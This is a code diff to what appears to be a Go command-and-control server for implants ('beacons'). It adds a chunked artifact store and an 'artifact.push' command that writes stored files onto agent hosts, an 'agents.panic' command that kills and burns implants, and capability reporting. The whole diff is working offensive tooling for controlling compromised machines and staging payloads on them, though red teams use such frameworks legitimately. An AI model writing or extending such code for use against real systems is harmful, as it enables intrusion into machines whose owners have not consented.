@@ -29,7 +29,16 @@ const (
 	TaskKindExit = "exit"
 	// TaskKindExtension runs an armory extension in memory on an agent.
 	TaskKindExtension = "ext"
+	// TaskKindUpload writes a chunk of a file on an agent.
+	TaskKindUpload = "upload"
 )
+
+// artifactChunk is the size of one upload task when the server pushes a
+// stored artifact to an agent.
+//
+// A chunk travels inside a task batch, and the batch travels inside one
+// frame, so the chunk stays well below the frame budget.
+const artifactChunk = 256 << 10
 
 // serveOperatorTCP runs a persistent operator control channel.
 func (s *Server) serveOperatorTCP(conn net.Conn) {
@@ -672,6 +681,51 @@ func (s *Server) handleRPC(log *slog.Logger, op *hub.Operator, req map[string]an
 		}
 		return reply(upk.Map{"task_id": t.ID, "agent_id": id})
 
+	case "agents.panic":
+		// The end of an engagement on the target side.  The beacon is told
+		// to exit and the agent is marked as burned, so it refuses every
+		// further task: work that was queued while the operator is still
+		// cleaning up never reaches the machine.
+		//
+		// "all" is the deliberate override of the selection rule and it
+		// reaches the agents that are asleep as well: the exit command is
+		// delivered on their next check-in, so a sleeping implant still
+		// dies.
+		var targets []*store.Agent
+		if all, _ := args["all"].(bool); all {
+			targets = s.Hub.SelectAgents(hub.AgentFilter{})
+		} else {
+			selected, err := s.selectTargets(args)
+			if err != nil {
+				return fail("agents.panic: %v", err)
+			}
+			targets = selected
+		}
+		if len(targets) == 0 {
+			return fail("agents.panic: no agents matched")
+		}
+		panicked := make([]any, 0, len(targets))
+		skipped := make([]any, 0)
+		for _, a := range targets {
+			if a.Panicked {
+				skipped = append(skipped, a.ID)
+				continue
+			}
+			// The exit command goes first: a burned agent refuses every
+			// task, including the one that shuts it down.
+			if _, err := s.Hub.SubmitTask(a.ID, TaskKindExit, map[string]any{}); err != nil {
+				skipped = append(skipped, a.ID)
+				continue
+			}
+			s.Hub.Panic(a.ID)
+			panicked = append(panicked, a.ID)
+		}
+		return reply(upk.Map{
+			"panicked": panicked,
+			"count":    int64(len(panicked)),
+			"skipped":  skipped,
+		})
+
 	case "events.test":
 		s.Hub.Emit(hub.Event{Kind: "operator.test", Data: map[string]any{"from": op.Name}})
 		return reply(upk.Map{"emitted": true})
@@ -915,9 +969,164 @@ func (s *Server) handleRPC(log *slog.Logger, op *hub.Operator, req map[string]an
 			"schedules": int64(schedules),
 		})
 
+	// ---- the server-side file store ------------------------------------
+	case "artifact.list":
+		if s.Artifacts == nil {
+			return fail("artifact.list: this server has no artifact store")
+		}
+		entries := s.Artifacts.List()
+		out := make([]any, 0, len(entries))
+		for _, e := range entries {
+			out = append(out, upk.Map{
+				"name":    e.Name,
+				"sha256":  e.SHA256,
+				"size":    e.Size,
+				"created": e.Created.Format(time.RFC3339),
+				"updated": e.Updated.Format(time.RFC3339),
+			})
+		}
+		return reply(upk.Map{"artifacts": out, "count": int64(len(out))})
+
+	case "artifact.put":
+		// The upload is chunked: the frames are bounded, so a file arrives
+		// as a series of appends at increasing offsets.  The last chunk
+		// carries "eof" and is the one that writes the blob.
+		if s.Artifacts == nil {
+			return fail("artifact.put: this server has no artifact store")
+		}
+		name, _ := args["name"].(string)
+		if name == "" {
+			return fail("artifact.put needs a name")
+		}
+		data, _ := args["data"].([]byte)
+		offset, _ := asInt64(args["offset"])
+		eof, _ := args["eof"].(bool)
+		if offset == 0 {
+			// The first chunk starts a fresh upload and replaces whatever
+			// was stored under the name before.
+			if err := s.Artifacts.Begin(name); err != nil {
+				return fail("artifact.put: %v", err)
+			}
+		}
+		if len(data) > 0 {
+			received, err := s.Artifacts.Append(name, offset, data)
+			if err != nil {
+				return fail("artifact.put: %v", err)
+			}
+			if !eof {
+				return reply(upk.Map{"name": name, "received": int64(received), "eof": false})
+			}
+		} else if !eof {
+			return reply(upk.Map{"name": name, "received": int64(s.Artifacts.Pending(name)), "eof": false})
+		}
+		entry, err := s.Artifacts.Finish(name)
+		if err != nil {
+			return fail("artifact.put: %v", err)
+		}
+		return reply(upk.Map{
+			"name":   entry.Name,
+			"sha256": entry.SHA256,
+			"size":   entry.Size,
+			"eof":    true,
+		})
+
+	case "artifact.get":
+		if s.Artifacts == nil {
+			return fail("artifact.get: this server has no artifact store")
+		}
+		name, _ := args["name"].(string)
+		if name == "" {
+			return fail("artifact.get needs a name")
+		}
+		offset, _ := asInt64(args["offset"])
+		limit, _ := asInt64(args["limit"])
+		data, entry, err := s.Artifacts.ReadRange(name, offset, limit)
+		if err != nil {
+			return fail("artifact.get: %v", err)
+		}
+		return reply(upk.Map{
+			"name":   entry.Name,
+			"sha256": entry.SHA256,
+			"size":   entry.Size,
+			"offset": offset,
+			"eof":    offset+int64(len(data)) >= entry.Size,
+			"data":   data,
+		})
+
+	case "artifact.remove":
+		if s.Artifacts == nil {
+			return fail("artifact.remove: this server has no artifact store")
+		}
+		name, _ := args["name"].(string)
+		if name == "" {
+			return fail("artifact.remove needs a name")
+		}
+		if err := s.Artifacts.Remove(name); err != nil {
+			return fail("artifact.remove: %v", err)
+		}
+		return reply(upk.Map{"name": name, "removed": true})
+
+	case "artifact.push":
+		// The file travels to the agent as a chain of upload tasks, one per
+		// chunk: the beacon writes them one after the other and only the
+		// last one closes the file and reports its digest.
+		if s.Artifacts == nil {
+			return fail("artifact.push: this server has no artifact store")
+		}
+		name, _ := args["name"].(string)
+		agentID, _ := args["agent"].(string)
+		if agentID == "" {
+			agentID, _ = args["id"].(string)
+		}
+		if name == "" {
+			return fail("artifact.push needs a name")
+		}
+		if agentID == "" {
+			return fail("artifact.push needs an agent")
+		}
+		raw, entry, err := s.Artifacts.Read(name)
+		if err != nil {
+			return fail("artifact.push: %v", err)
+		}
+		path, _ := args["path"].(string)
+		if path == "" {
+			path = "/tmp/" + entry.Name
+		}
+		stages := make([]hub.ChainStage, 0, 4)
+		for off := 0; off < len(raw) || off == 0; off += artifactChunk {
+			end := off + artifactChunk
+			if end > len(raw) {
+				end = len(raw)
+			}
+			stages = append(stages, hub.ChainStage{
+				Kind: TaskKindUpload,
+				Args: map[string]any{
+					"path":   path,
+					"offset": int64(off),
+					"data":   raw[off:end],
+					"eof":    end >= len(raw),
+				},
+			})
+			if len(raw) == 0 {
+				break
+			}
+		}
+		task, chain, err := s.Hub.SubmitChain(agentID, op.Name, stages)
+		if err != nil {
+			return fail("artifact.push: %v", err)
+		}
+		return reply(upk.Map{
+			"chain_id": chain.ID,
+			"task_id":  task.ID,
+			"agent_id": agentID,
+			"stages":   int64(len(stages)),
+			"size":     entry.Size,
+			"sha256":   entry.SHA256,
+			"path":     path,
+		})
+
 	// ---- the journal and the open sessions ----------------------------
-	case "sessions.list":
-		// The interactive sessions that are open, per agent.
+	case "sessions.list":		// The interactive sessions that are open, per agent.
 		sessions := s.Hub.Sessions()
 		rows := make([]any, 0, len(sessions))
 		for _, sess := range sessions {
@@ -1160,6 +1369,10 @@ func agentDataMap(a *store.Agent) map[string]any {
 		"tags":       a.Tags,
 		"first_seen": a.FirstSeen.Format(time.RFC3339),
 		"last_seen":  a.LastSeen.Format(time.RFC3339),
+		// The capability list is what the beacon said it can run, so the
+		// operator knows the host's reach before a task is queued.
+		"caps":     a.Caps,
+		"panicked": a.Panicked,
 	}
 }
 
